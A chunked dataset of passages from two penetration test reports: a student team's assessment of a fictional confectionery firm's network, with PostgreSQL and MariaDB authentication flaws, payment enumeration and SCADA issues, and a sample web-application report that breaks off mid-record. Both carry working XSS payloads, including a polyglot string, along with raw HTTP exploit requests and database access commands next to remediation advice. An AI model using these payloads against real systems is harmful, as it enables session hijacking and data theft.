overview by including each discovered vulnerability’s evaluated risk, exploitation details, and recommended remediation steps. Based upon the results of the assessment, AEC is at risk to be fined by payment providers due to severe PCI DSS violations. These fines could range",
    "metadata": {
      "doc_id": "University of New Haven - Penetration Test Report",
      "chunk_id": 1
    }
  },
  {
    "text": "surface. The Technical Findings section expands upon the report overview by including each discovered vulnerability’s evaluated risk, exploitation details, and recommended remediation steps. Based upon the results of the assessment, AEC is at risk to be fined by payment providers due to severe PCI DSS violations. These fines could range from $5,000 to $100,000 per month depending on factors such as size of business [1]. Based on these issues, we suggest spending resources to become complaint. Details of all PCI DSS violations can be found in Section 2.3.1. New Haven Hacking Inc. was able to gain full access to a SCADA system using the default credentials. This device is extremely important as it is critical to industrial systems which operate the storage, delivery, and packaging warehouse facility. Similarly, the industrial control device is not isolated in any way, could be manipulated by any user on the network. It is important to take this with extreme caution, as malicious tampering with these devices couldresultinlossoflife. Thiswouldresultinunwantedattention, couldharmthecompanies reputation, and could cost AECvast sums of money from both lawsuits and long term loss of business. During this engagement, a total of 11 vulnerabilities were found in AEC’s network. In terms ofseverity, 3vulnerabilitiesarecritical, 3vulnerabilitiesarehigh, 1vulnerabilityismoderate, and 4 vulnerabilities posed low risk. Many of the vulnerabilities in the environment are due to improper authentication, default credentials, or not applying principles of least privileges. More information about these vulnerabilities can be found in Section 4. Page 2\\n1.2 Engagement Overview New Haven Hacking Inc. conducted a penetration test starting on January 7th, 2022 based upon the Request for Proposal (RFP) document obtained by New Haven Hacking Inc.. Focus was placed on the following goals during the engagement: • Assessing internally developed and customized software packages. • Assessment of Industrial controls within a storage, delivery, and packing warehouse facility. • Assessment of APIs related to payment, transaction, billing, and inventory processing systems. • Discovering vulnerabilities and complications which could impact the confidentiality, integrity, and availability (CIA) of AEC’s information systems. • Assisting AEC in improving their security posture. • Evaluate AEC’s security posture against the Payment Card Industry - Digital Security Standard (PCI-DSS). 1.3 Scope of Engagement The full scope of this penetration test was limited to the following CIDR range. At the request of AEC , the first day of the engagement (Jan 7 2022) excluded hosts 10.0.17.50 and 10.0.17.51 in order to ensure availability of critical infrastructure. These hosts were included on the second day (Jan 8th starting at 9:20AM) to ensure proper testing. Care was taken by New Haven Hacking Inc. to ensure penetration test activity did not reduce the availability of industrial systems. • 10.0.17.0/24 The penetration test was conducted with extreme care to ensure actions were contained within the defined scope. Additionally, because the engagement was within a production environment, the team ensured that no services were disrupted. New Haven Hacking Inc. did not exfiltrate, modify, or delete any data not included in this report. NewHavenHackingInc.isavailableuponrequesttoimprovethesecurity,protecttheemploy- ees, and customers of AEC. This includes",
    "metadata": {
      "doc_id": "University of New Haven - Penetration Test Report",
      "chunk_id": 2
    }
  },
  {
    "text": "ensure actions were contained within the defined scope. Additionally, because the engagement was within a production environment, the team ensured that no services were disrupted. New Haven Hacking Inc. did not exfiltrate, modify, or delete any data not included in this report. NewHavenHackingInc.isavailableuponrequesttoimprovethesecurity,protecttheemploy- ees, and customers of AEC. This includes verifying and validating implemented mitigation techniquesaswellasdeployingsecuritystrategiestoensureAEChasseverallayersofdefense. The team is happy to continue a partnership with AEC and excited to work along side them in securing their operations. Page 3\\n2 Observations This section serves as a high level overview of the security posture of AEC. A detailed list of all discovered vulnerabilities can be found in Section 4. It is important to note that this list is by no means exhaustive and that there are most likely vulnerabilities that New Haven Hacking Inc. did not find. Improper Authentication Misconfigurations 1 3 Vulnerabilities 1 2 2 Default Credentials Data Exposures 2 Network Design Figure 1: Summary of Issues within the Network Default Credentials & Lack of authentication The most immediate observation about AEC’s security posture is that default, null, and passwordless authentication was discovered on multiple systems. New Haven Hacking Inc. was able to gain access into a SCADA system using the same credentials (which were default) as the last engagement. The system in question is critical to the storage, delivery, and packaging processes within the warehouse facility. Moreover, several databases contained this same issue and were found to not be requiring password authentication. It is important to remember these credentials are for critical services and PII. These weaknesses can have an enormous impact on AEC’s ability to operate if discovered by threat actors. These vulnerabilities can be remediated with low cost and have an outsized impact on the security of AEC. More details on mitigation for vulnerabilities such as these can be found in each vulnerability’s remediation suggestions in Section 4. Page 4\\n2.1 Summary of Recommendations The following is an overview of recommendations which should be implemented: • Resolve any PCI DSS compliance violations in Section 2.3.1 and ensure that AEC is currently meeting all documentation requirements set by PCI DSS. • Implement both ingress & egress filtering to reduce attack surface on hosts. • Ensure all hosts use least privilege principals to reduce attack surface. • Ensure proper encryption is used for confidential data (e.g. passwords and card holder data). • Implementation of a strong password policy. • Implement Multi-Factor authentication to provide defense in depth in addition to pass- words. • Uses centralized logging to be able to respond to potential incidents faster. • Ensure null or password-less authentication is not allowed. • Ensure only necessary services are running within the subnet. 2.2 Positive Security Measures As the engagement progressed, New Haven Hacking Inc. was impeded by the security safe- guards AEC had in place. A number of basic security best practices were observed that limited New Haven Hacking Inc.’s ability to move through the network. Some instances of aforementioned security practices implemented by AEC include: • The usage",
    "metadata": {
      "doc_id": "University of New Haven - Penetration Test Report",
      "chunk_id": 3
    }
  },
  {
    "text": "progressed, New Haven Hacking Inc. was impeded by the security safe- guards AEC had in place. A number of basic security best practices were observed that limited New Haven Hacking Inc.’s ability to move through the network. Some instances of aforementioned security practices implemented by AEC include: • The usage of TLS on websites to protect information. • TheusageofCross-OriginResourceSharing(CORS)headerspreventedspecificattacks. • The marketplace & music player required authentication. • Some APIs required authentication in order to query sensitive information (although not all). These controls should be continuously monitored and regulated to maintain the company’s security posture. Page 5\\n2.3 Compliance 2.3.1 PCI DSS Violations The following table details violations of the PCI Data Security Standard discovered by New Haven Hacking Inc. over the scope of this engagement. Table 1: PCI DSS Compliance Violations. Regulation Reason Reference PCI DSS 1.1.4 A firewall is not implemented at every internet Section 4.5.1 connection. PCI DSS 1.2 The PostgreSQL server that stores cardholder Section 4.1.1 data does not have a firewall restricting con- nections from untrusted networks. PCI DSS 1.3 The PostgreSQL server is not segmented Section 4.1.1 through the use of a DMZ. PCI DSS 2.1 Default accounts were not removed from all Sections 4.1.1 systems on the network. PCI DSS 2.2 No evidence found to indicate that AEC has N/A configuration standards. PCI DSS 2.2.1 The server “charley” had more than one pri- Sections 4.1.1 & mary function implemented: MariaDB and 4.2.1 PostgreSQL. PCI DSS 2.2.2 No evidence of documentation for enabled in- N/A secure services, daemons, or protocols. PCI DSS 2.2.4 There were insecure security parameters Sections 4.1.1 present on system configurations. No found evidence of documented common system se- curity parameters and no evidence of system configuration standards. PCI DSS 2.4 An inventory of what was considered to be in N/A scope for PCI DSS was not provided to pen- etration testers nor found during the engage- ment. PCI DSS 2.5 No evidence of security policies and opera- N/A tional procedures was found during the en- gagement Page 6\\n3 Testing Methodology 3.1 Penetration Testing Execution Standard Throughout the engagement New Haven Hacking Inc., references the Penetration Testing Execution Standard (PTES) when conducting security assessments [2]. Figure 2: PTES Methodology 3.2 MITRE ATT&CK Framework MITRE ATT&CK is a knowledge base of Tactics, Techniques, and Procedures (TTPs) based upon real-world observations from security professionals. ATT&CK is a curated knowledge base for cyber adversary behavior, reflecting the attack lifecycle and platforms known to target. New Haven Hacking Inc. uses ATT&CK to aide in understanding TTPs that can be used to conduct an attack against AEC that could be conduct by real world adversaries [3]. 3.3 OWASP Top 10 Referenced in this report is the Open Web Application Security Project (OWASP) Top 10 when applications are found within the applicable scope [4]. OWASP Top 10 focuses vulner- abilities focus on common vulnerabilities that pose security risks to web applications: Table 2: OWASP Top 10 1. Broken Access Controls 6. Vulnerable and Outdated Components 2. Cryptographic Failures",
    "metadata": {
      "doc_id": "University of New Haven - Penetration Test Report",
      "chunk_id": 4
    }
  },
  {
    "text": "Web Application Security Project (OWASP) Top 10 when applications are found within the applicable scope [4]. OWASP Top 10 focuses vulner- abilities focus on common vulnerabilities that pose security risks to web applications: Table 2: OWASP Top 10 1. Broken Access Controls 6. Vulnerable and Outdated Components 2. Cryptographic Failures 7. Identification and Authentication Failures 3. Injection 8. Software and Data Integrity Failures 4. Insecure Design 9. Security Logging and Monitoring Failures 5. Security Misconfiguration 10. Server-Side Request Forgery 3.4 PCI DSS Auditing One of the requests of AEC was for experience in PCI DSS from the RFP. Throughout the engagement, New Haven Hacking Inc. audited PCI DSS compliance in accordance with the proper Self-Assessment Questionnaire (SAQ). By doing this, New Haven Hacking Inc. can ensure which PCI DSS security requirements are met in accordance with the proper SAQ for Page 7\\nthe type(s) of transactions being performed by AEC. Each PCI DSS compliance failure can be found in Section 2.3.1. 3.5 NIST SP 800-53 NIST SP 800-53 is the National Institute of Standards and Technology Special Publication 800-53, Security and Privacy Controls for Federal Information Systems and Organization. NIST 800-53 is a security compliance standard that offers guidance for how organizations should select then maintain security and privacy controls for information systems. NIST 800-53 is mandatory for all federal agencies however, its guidelines can be adopted by any organization operating information systems with sensitive or regulated data. This standard providesacatalogofprivacyandsecuritycontrolsforprotectingagainstvariousthreats. Table 3 provides security and privacy control methodology which are organized into 20 fami- lies. Thesecontrolfamiliesarereferencedthroughoutthedocumentandareusedtoconstitute common terminology. Additionally, referenced in NIST 800-53 is control families enhance- ments to help provide guidance to aide in securing AEC’s information systems [5]. Table 3: NIST 800-53 Security and Privacy Control Families for Compliance. ID Family ID Family AC Access Control PE Physical and Environmental Protec- tion AT Awareness and Training PL Planning AU Audit and Accountability PM Program Management CA Assessment, Authorization, Monitor- PS Personnel Security ing CM Configuration Management PT PII Processing and Transparency CP Contingency Planning RA Risk Assessment IA Identification and Authentication SA System & Services Acquisition IR Incident Response SC System & Communications Protec- tion MA Maintenance SI System & Information Integrity MP Media Protection SR Supply Chain Risk Management Page 8\\n4 Technical Findings This table shows the total number of vulnerabilities found during the penetration test en- gagement. The vulnerabilities are categorized based on the risk level. The risk levels were calculated using the Common Vulnerability Scoring System (CVSS) [6]. Risk Level and Total Number of Discovered Vulnerabilities Severity Low Moderate High Critical (0.1-3.9) (4.0-6.9) (7.0-8.9) (9.0-10.0) Vulnerability Count 1 1 1 1 The following table breaks down the discovered vulnerabilities by overall risk score, impact, and exploitability. The scores were calculated using NIST’s CVSS v3.1 calculator [7]. Summary of Vulnerabilities by Base Score Risk Summary Overall Risk Score Impact Exploitability Lack of PostgreSQL 9 8 10 Authentication Lack of MariaDB Authentication 7.5 5 10 Payment Transaction 4.5 4 5 Enumeration ScadaBR Reflected XSS 1.25 1 1.5",
    "metadata": {
      "doc_id": "University of New Haven - Penetration Test Report",
      "chunk_id": 5
    }
  },
  {
    "text": "exploitability. The scores were calculated using NIST’s CVSS v3.1 calculator [7]. Summary of Vulnerabilities by Base Score Risk Summary Overall Risk Score Impact Exploitability Lack of PostgreSQL 9 8 10 Authentication Lack of MariaDB Authentication 7.5 5 10 Payment Transaction 4.5 4 5 Enumeration ScadaBR Reflected XSS 1.25 1 1.5 (Username) Page 9\\n4.1 Critical Risk 4.1.1 Lack Of PostgreSQL Authentication Threat Level: Critical (9.5) Description: The host Charley on the network did not require password authentication for the postgres user in PostgreSQL. As a result, attackers can access all databases on charley and enumerate data found. The postgres user has full control over the database within the host. Figure 3: User postgres does not require a password to authenticate. Potential Business Impact: The data stored within this database contained unencrypted database information which is a direction violation of PCI DSS more information information can be found in Section 2.3.1. Failures of PCI DSS can result in fines and other punishments. Each security incidents and breaches can result of a $500,000 fine [8]. Figure 4 shows that credit card information was stored encrypted. Affected Host: Eggdicator (10.0.17.10) Scrumdiddlyumptious (10.0.17.12) Charley (10.0.17.14) Exploitation Details: A user who can connect to 10.0.17.14 can connect to the postgresql server by running the following command: psql −U postgres −p 5432 −h 10.0.17.14 Recommended Remediation: Page 10\\nFigure 4: PostgreSQL Billing Table stored in the clear. Harden the PostgreSQL server to require password authentication. Additionally, having firewall access controls to restrict what respective IP addresses can access the database would provide an additional layer of security. ALTER USER postgres PASSWORD ‘B3tt3rP@ssw0rd ’ ; Additionally, the PostgreSQL instance could be further hardened by making rules in the pg_hba.conf file to only allow for authentication from certain hosts. More information about this configuration file can be found in the references for this section. References: https://www.postgresql.org/docs/13/auth-password.html https://www.postgresql.org/docs/9.2/auth-pg-hba-conf.html Page 11\\n4.2 High Risk 4.2.1 Lack of MariaDB Authentication Threat Level: High (7.5) Description: UnauthenticatedaccesstoaMySQLdatabasepermitsaccess/modificationtosensitivedatasets, including the following: • Customer Accounts and passwords (Base64 encoded). • Customer PII - includes phone numbers, address, and payments (including amounts). • Invoices and payments. • Creation of administrator accounts for AEC’s croissant marketplace. • Insertion, deletion, and modification of all data within the database. Figure 5: Passwordless Root MariaDB Access Potential Business Impact: This host (Charley) can severely impact the Confidentiality, Integrity, and Availability (CIA) of transactions within the warehouse management systems. Improper encoding schemes result in an environment in which all of the AEC store website (Scrumdiddlyumptious) users’ passwords can be decoded from base64. All accounts can also be modified to granted administrator level access on the AEC store. As data is parsed through the root user, transactions, account details, items (for sale), and other information which is integral to AEC’s ability to sell its products online may be Page 12\\nsubjecttounauthorizedmodification. Thisdataisnotdirectlyaccessedbythewebstorehost (Scrumdiddlyumptious), but rather through an API endpoint host (Whatchamacallit). Affected Hosts: Charley (10.0.17.14) Scrumdiddlyumptious (10.0.17.12) Whatchamacallit (10.0.17.13) Exploitation Details: New Haven Hacking Inc. used the MySQL command line application to query the unau-",
    "metadata": {
      "doc_id": "University of New Haven - Penetration Test Report",
      "chunk_id": 6
    }
  },
  {
    "text": "information which is integral to AEC’s ability to sell its products online may be Page 12\\nsubjecttounauthorizedmodification. Thisdataisnotdirectlyaccessedbythewebstorehost (Scrumdiddlyumptious), but rather through an API endpoint host (Whatchamacallit). Affected Hosts: Charley (10.0.17.14) Scrumdiddlyumptious (10.0.17.12) Whatchamacallit (10.0.17.13) Exploitation Details: New Haven Hacking Inc. used the MySQL command line application to query the unau- thenticated database as the root user. All customer information could be obtained without modifying the database schema or contents. This user also had write permissions, meaning a malicious actor could arbitrarily modify database contents. Figure 6 shows the connection from the PostgreSQL server and initial shell commands. Figure 6: MariaDB tokens Table Dump Recommended Remediation: A minimal number of hosts should be able to interact on the network with the MySQL database. By limiting network access to only those required hosts, potential attacks against the MySQL service are minimized. The following iptables commands can be used to enable access controls and limit which hosts can reach MySQL: iptables −A INPUT −p tcp −−dport 3306 −s <IP> −j ACCEPT iptables −A INPUT −p tcp −−dport 8000 −j DROP If a firewall is not an option due to constraints within the environment (we recommend using a firewall), another option is to use ACLs within MySQL. This can be done by altering Page 13\\nusers to only be accessible via certain IPs or domains. This can be done using the following commands: CREATE USER ‘user ’@‘ localhost ’ IDENTIFIED BY ‘password ’ ; CREATE USER ‘user ’@‘10.0.17.13 ’ IDENTIFIED BY ‘password ’ ; References: https://dev.mysql.com/doc/mysql-security-excerpt/8.0/en/general-security-iss ues.html https://dev.mysql.com/doc/mysql-security-excerpt/8.0/en/access-control.htm l https://www.digitalocean.com/community/tutorials/iptables-essentials-common- firewall-rules-and-commands Page 14\\n4.3 Moderate Risk 4.3.1 Payment Transaction Enumeration Threat Level: Moderate (4.5) Description: The Jawbreaker portal on the eggdicator host allows users to enter transaction IDs and returnstransactioninformationincludingtheamount,customer_id,andstatus. Allcustomer transactions can be enumerated without any authentication (see Figure 7). Figure 7: Powershell Script to pull all Customer transactions. Potential Business Impact: Potential attackers could extract all transactions regarding the revenue of AEC. Although thesestransactionsonlyrefertothecustomerasaUUID,thevalueisuniquetothatcustomer and could be used to associate multiple transactions to specific purchasers. Page 15\\nAffected Hosts: Eggdicator (10.0.17.10) Exploitation Details: Thepowershellscriptshownabovecanbeusedbynavigatingtohttps://10.0.17.10/payment/$i and replacing “$i” with a numeric value. This would return JSON data regarding a trans- action if one exists with the given ID. Based on results obtained from the script, a total of 6469 transactions were present and extractable. Recommended Remediation: Using a UUID instead of an id for each transaction would mitigate sequential enumeration and would greatly increase the time needed for a brute force attack. Additionally, rate limiting hosts to only a specific number of requests per minute (more information can be found in references) would further mitigate the attack. Moreover, implementing authentica- tion on the API would limit enumeration to only authorized users. Access tokens or basic http authentication are both options which would help reduce the risk introduced by this vulnerability. References: https://www.nginx.com/blog/rate-limiting-nginx/ https://docs.nginx.com/nginx /admin-guide/security-controls/configuring-http-basic-authentication/ Page 16\\n4.4 Low Risk 4.4.1 ScadaBR Reflected XSS (Username) Threat Level: Low (1.25) Description: A cross-site scripting (XSS) vulnerability was found in the login portal of ScadaBR. A mali- cious actor could",
    "metadata": {
      "doc_id": "University of New Haven - Penetration Test Report",
      "chunk_id": 7
    }
  },
  {
    "text": "authentication are both options which would help reduce the risk introduced by this vulnerability. References: https://www.nginx.com/blog/rate-limiting-nginx/ https://docs.nginx.com/nginx /admin-guide/security-controls/configuring-http-basic-authentication/ Page 16\\n4.4 Low Risk 4.4.1 ScadaBR Reflected XSS (Username) Threat Level: Low (1.25) Description: A cross-site scripting (XSS) vulnerability was found in the login portal of ScadaBR. A mali- cious actor could supply malicious Javascript to redirect users and steal cookies. Figure 8: XSS Vulnerability in username input field Potential Business Impact: Because this vulnerability uses reflected XSS instead of stored XSS, phishing would most likely be required for a successful exploit. However, an employee of AECfalling for a phish- ing campaign could lead to drive-by downloads and cookie theft, resulting in the potential compromise of machines on the network. Affected Host: Crunch (10.0.17.50) Crunchserial (10.0.17.51) Exploitation Details: Results can be reproduced by navigating to http://10.0.17.50:9090/ScadaBR/ (without hav- ing been authenticated beforehand) and typing the following in the username field: admin\"><script>alert (\"XSS\")</script> This will result in a reflected cross-site vulnerability displaying an alert on the page with the text “XSS”. While the alert text is only an example, a threat actor could include arbitrary JavaScript in the payload. Recommended Remediation: Validate & sanitize all form fields to prevent XSS attacks. Use a Web application firewall (WAF) to block the execution of malicious scripts. Additionally, convert all alphanumeric Page 17\\ncharacters to HTML character entities before displaying user input. To ensure that cookies cannot be stolen, it is recommended to include in the headers “Secure” and “HttpOnly” so that cookies are not accessible to unintended parties and are sent over HTTPS. At the moment, the web traffic on the ScadaBR server is not encrypted. The Secure header can only be implemented once TLS is implemented and enabled on the host. References: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies CEHv11 Ethical Hacking and Countermeasures - Volume 2 Page 18\\n4.5 Informational 4.5.1 Insufficient Firewalls Description: During the engagement, many of the services and hosts interacted displayed insufficient Firewall Rules. Potential Business Impact: This could save potential incidents of breach as by enabling firewallswithstrongrulescouldthwartattackersfromgainingunauthorizedaccesstosystems that potentially contain security vulnerabilities such as remote code execution. Recommended Remediation: On hosts setup up proper firewalls using iptables, ufw, or other software. Examples of these can be found in Section 4.2.1. PCI DSS requires firewall zone-based controls between trusted and untrusted zones. Some best practices for firewalls are to: • Block traffic by default • Set Explicit Firewall Rules First • Establish firewall configuration change plan • Optimize firewall rules • Update Firewall Software Regularly Additionally, it may also be beneficial for AEC to implement intrusion-detection and/or intrusion-prevention systems on the network to help with detecting and preventing future exploitation of the network. References: https://backbox.com/7-firewall-best-practices-for-securing-your-network/ https://www.checkpoint.com/cyber-hub/network-security/what-is-firewall/8-fir ewall-best-practices-for-securing-the-network/ Page 19\\n5 Conclusion AEC provides the community with delicious confections. The stability and integrity of the system that provides pastries is necessary to maintaining the luxuries of modern life. It is for this reason that the threats outlined in this report should be taken seriously and immediately remedied. The gravity of the vulnerabilities described above cannot be understated. An attacker",
    "metadata": {
      "doc_id": "University of New Haven - Penetration Test Report",
      "chunk_id": 8
    }
  },
  {
    "text": "The stability and integrity of the system that provides pastries is necessary to maintaining the luxuries of modern life. It is for this reason that the threats outlined in this report should be taken seriously and immediately remedied. The gravity of the vulnerabilities described above cannot be understated. An attacker with the same level of access as what New Haven Hacking Inc. was granted for this engagement could gain direct control of the industrial control systems of AEC’s factory. If thisweretohappeninanuncontrolledsetting, thevulnerabilitieswouldbesogravethatAEC might be liable for negligence in the result of loss of life and externalities as a result of such an attack. Additionally, AEC may incur penalties for violations of PCI DSS requirements. New Haven Hacking Inc. hopes that this relationship with AEC will continue in the future. We look forward to working together to ensure the vulnerabilities discussed in this report are properly remediated and to help continually improve AEC’s security posture. Page 20\\nReferences [1] PCI Compliance Fees, Fines, and Penalties: What Happens After a Breach? Apr. 2020. url: https://www.lbmc.com/blog/pci-compliance-fees-fines-penalties/. [2] Main Page. url: http://www.pentest-standard.org/index.php/Main_Page. [3] Mitre ATT&CK®. url: https://attack.mitre.org/. [4] Introduction. url: https://owasp.org/Top10/. [5] Joint Task Force. Security and Privacy Controls for Information Systems and Organi- zations. Dec. 2020. url: https://csrc.nist.gov/publications/detail/sp/800-53 /rev-5/final. [6] ForumofIncidentResponseandIncSecurityTeams.CVSS v3.1 Specification Document. https://www.first.org/cvss/v3.1/specification-document. 2019. [7] National Institute of Standards and Technology. Common Vulnerability Scoring System Calculator. https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator. [8] Financial Affairs. url: https://financial.ucsc.edu/pages/security_penalties .aspx. Page 21\\nAppendices A Network Topology Figure 9: Network Topology Page 22\\nB Tools Name Description Link Nmap Network and vulnerability https://nmap.org/ scanner Metasploit Exploitation framework https://github.com/rapid7/metasplo it-framework DIRB Directory Brute Force Tool https://github.com/v0re/dirb Gobuster Directory Brute Force Tool https://github.com/OJ/gobuster Meterpreter Reverse Shell https://github.com/rapid7/meterpre ter Crowbar Brute forcing tool https://github.com/galkan/crowbar netcat Network utility https://github.com/diegocr/netcat hydra Brute Forcing tool https://github.com/vanhauser-thc/t hc-hydra Wireshark Network traffic analyzer https://www.wireshark.org/ Portswigger Burp Suite Web traffic analysis tool https://portswigger.net/burp psql PostgreSQL interactive ter- https://www.postgresql.org/docs/13 minal /app-psql.html Page 23",
    "metadata": {
      "doc_id": "University of New Haven - Penetration Test Report",
      "chunk_id": 9
    }
  },
  {
    "text": "Application Penetration Assessment Sample Report [Company Name] Findings, Attack Narrative, and Recommendations [Date]\\nTable Of Contents Executive Summary ....................................................................................................................................... 3 Attack Narrative ............................................................................................................................................. 5 Stored Cross-Site Scripting .......................................................................................................................... 5 Instance 1 ................................................................................................................................................. 5 Instance 2 ................................................................................................................................................. 8 Instance 3 ............................................................................................................................................... 11 Instance 4 ............................................................................................................................................... 15 Authorization Restriction Bypass ................................................................................................................ 17 Instance 1 ............................................................................................................................................... 17 Instance 2 ............................................................................................................................................... 21 Open Redirect ............................................................................................................................................ 24 Session Hijacking ................................................................................................................................... 24 GraphQL Introspection Enabled ................................................................................................................. 33 Appendix A - Findings & Recommendations ............................................................................................. 35 1. Stored Cross-Site Scripting .................................................................................................................... 35 2. Authorization Restriction Bypass ............................................................................................................ 36 3. Open Redirect ........................................................................................................................................ 37 4. GraphQL Introspection Enabled ............................................................................................................. 38\\nExecutive Summary PurpleSec was contracted by the company to conduct an Application Penetration Assessment against their external facing web application architecture. The intent of an application assessment is to dynamically identify and assess the impact of potential security vulnerabilities within the application. During this assessment, both manual and automated testing tools and techniques were employed to discover and exploit possible vulnerabilities. All testing activities were conducted against the {URL} development environment to limit the impact of any service disruptions. Assessment of the {URL} application began on {Begin.Date} and concluded on {End.Date}. Testing was conducted from both an unauthenticated and authenticated context. Unauthenticated testing examines the exterior security posture of an application and looks for vulnerabilities that do not require authentication to exploit, while authenticated tests focus on discovering and exploiting vulnerabilities on portions of the internal application that are only accessible after successful authentication. Assessors were provided both a regular user and an administrative user account to assess the internal security controls of the application. PurpleSec assessors were able to identify and exploit instances of the following vulnerabilities: Vulnerability Severity Cross-Site Scripting (Stored) High Authorization Restriction Bypass High Open-Redirect High Low Severity 1 Low Low Severity 2 Low The Stored Cross-Site Scripting vulnerability had four separate instances. Each of these instances could be leveraged by an attacker to perform unauthorized actions on behalf of the victim, conduct phishing attacks, or force the download of malicious software.\\nThe Authorization Restriction Bypass vulnerability had two separate instances; both would allow an attacker to obtain sensitive information on application users and their data. This unauthorized information disclosure could be leveraged to aid other attacks and cause reputational harm. The last high-severity finding discovered was an Open-Redirect vulnerability. This vulnerability could allow an attacker to steal session cookies, which in turn would allow an attacker to perform actions within the application as the victim user. Finally, two low-severity findings were also identified during testing. While these vulnerabilities pose no immediate threat to the application or its users, remediating them would further strengthen the application's overall security posture. A detailed explanation of the above vulnerabilities can be found in Appendix A – Findings.\\nAttack Narrative Stored Cross-Site Scripting Severity: High Cross-Site Scripting (XSS) is a client-side code injection attack. It occurs when data enters from an untrusted source and is included in dynamic content without being validated for malicious content by the application. Instance 1 The application",
    "metadata": {
      "doc_id": "Web-Application-Penetration-Test-Sample-Report",
      "chunk_id": 0
    }
  },
  {
    "text": "be found in Appendix A – Findings.\\nAttack Narrative Stored Cross-Site Scripting Severity: High Cross-Site Scripting (XSS) is a client-side code injection attack. It occurs when data enters from an untrusted source and is included in dynamic content without being validated for malicious content by the application. Instance 1 The application allows malicious JavaScript to be saved into the \"searchCompany\" field while editing contact information for application users. The following payload was used to execute a JavaScript alert box: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/-- !>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>\\x3e Entering this payload into the “user searchCompany” field stores the XSS permanently on the application: POST /manage/crm/user?email=test%40the company HTTP/2 Host: {URL} Cookie:<snip> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 629 Origin: https://{URL} Referer: https://{URL}/manage/crm/user?email=test%40the company Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document\\nSec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Te: trailers Connection: close user%5Bname%5D=test1&user%5Bemail%5D=test%40the company&user[searchCompany]=jaVasCript%3A%2F*- %2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F%28%2F*+*%2FoNcliCk%3Dalert%28document.do main%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C% 2FteXtarEa%2F%3C%2FscRipt%2F-- %21%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%28document.domain%29%2F%2F%3E%5Cx3e& user%5Bcompany_id%5D=&tz=Africa%2FAbidjan&user%5Bpassword%5D=&user%5Bphone_number%5D =&user%5Baccessrole_id%5D=&user%5Baccount_status%5D=email_verified&user%5Bservice_name%5D =&user%5Bpricing_plan%5D=0&user%5Bindividual_sessions%5D=5&user%5Bglobal_panelist%5D=0&sav e=once HTTP/2 302 Found Date: Wed, 28 Jul 2021 02:21:13 GMT Content-Type: text/html; charset=UTF-8 Content-Length: 0 Location: https://{URL}/manage/crm/user?email=test%40the company Server: Apache/2.4 Strict-Transport-Security: max-age=31536000; includeSubdomains X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img-src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Access-Control-Allow-Origin: https://{URL} Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: GET,POST,PUT,PATCH,DELETE,OPTIONS Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X- Requested-With Vary: Origin Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate\\nDate: Wed, 28 Jul 2021 02:27:50 GMT Content-Type: text/html; charset=UTF-8 Content-Length: 59488 Server: Apache/2.4 Strict-Transport-Security: max-age=31536000; includeSubdomains X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img-src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Vary: Accept-Encoding name=\"user[searchCompany]\" class=\"form-control\" value=\"\" /> --> <input type=\"text\" id=\"companyName\" name=\"user[searchCompany]\" class=\"form-control\" value=\"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(document.domain) )//%0D%0A%0d%0a//////-- !&gt;\\x3csVg/\\x3e\" /> <input type=\"hidden\" id=\"companyId\" name=\"user[company_id]\" value=\"\" />\\nInstance 2 It is possible to upload malicious JavaScript through an Excel file upload. An example Excel template to upload application candidates can be downloaded. Inserting the following payload into either the First Name or Last Initial fields columns and uploading the template will cause store the XSS on the application: <h1 onclick=\"alert(1)\">test</h1> Figure 1 - Malicious Excel File Upload The saved XSS payload can be observed in a proxy: GET /ajax/project/32708/unreviewedCandidates HTTP/2 Host: {URL} Cookie: <snip> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0 Accept: */* Accept-Language: en-US,en;q=0.5\\nAccept-Encoding: gzip, deflate Referer: https://{URL}/project/32708/no-referrer Content-Type: application/x-www-form-urlencoded;charset=UTF-8 X-Requested-With: XMLHttpRequest Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Cache-Control: max-age=0 Te: trailers Connection: close HTTP/2 200 OK Date: Wed, 28 Jul 2021 12:44:21 GMT Content-Type: application/json; charset=utf-8 Content-Length: 12484 Server: Apache/2.4 Strict-Transport-Security: max-age=31536000; includeSubdomains X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img-src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Content-Disposition: attachment; filename=json.txt X-Content-Type-Options: nosniff Vary: Accept-Encoding\\n{\"id\":2350,\"name\":\"<h1 